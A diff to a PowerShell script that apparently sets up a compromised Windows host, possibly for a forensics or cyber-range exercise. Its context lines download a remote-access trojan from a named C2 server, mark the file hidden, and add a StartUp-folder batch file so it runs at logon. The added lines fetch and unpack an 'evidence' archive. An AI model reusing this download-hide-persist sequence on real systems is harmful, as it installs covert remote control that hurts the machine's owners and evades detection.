@@ -6,6 +6,7 @@
 param(
   [String]$defAdminUsr, 
   [String]$defAdminPwd,
+  [string]$localpath,
   [String]$hostname
 )
 
@@ -17,6 +18,8 @@ param(
 # Static URLs to download RAT and static download locat
 # CAUTION - C2 HUB MOST BE ONLINE AS THIS IS A STATIC DOWNLOAD OPERATION! <to be adjusted in future updates>
 $raturl = "http://north2.hub.envar.io/vault76kg/drvfrw.exe"
+# For C51 additional evidence file was provided by CC - downloading to D:\
+$evidenceurl = "http://north2.hub.envar.io/vault76kg/20210429C51EVIDENCE.zip"
 $startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.bat"
 
 
@@ -30,6 +33,11 @@ Invoke-WebRequest -uri $raturl -OutFile $localpath
 $hideFile = get-item $localpath -Force
 $hideFile.attributes = "Hidden"
 
+# Download EVIDENCE to Temporary Storage
+New-Item -Path 'D:\EvidenceFiles' -ItemType Directory
+Invoke-WebRequest -uri $evidenceurl -OutFile 'D:\evidence.zip'
+expand-archive -path 'D:\evidence.zip' -destinationpath 'D:\EvidenceFiles'
+Remove-Item 'D:\evidence.zip'
 
 # Add a startup script (BAT) to make sure RAT is run by the logging user
 add-content $startup "@echo off"
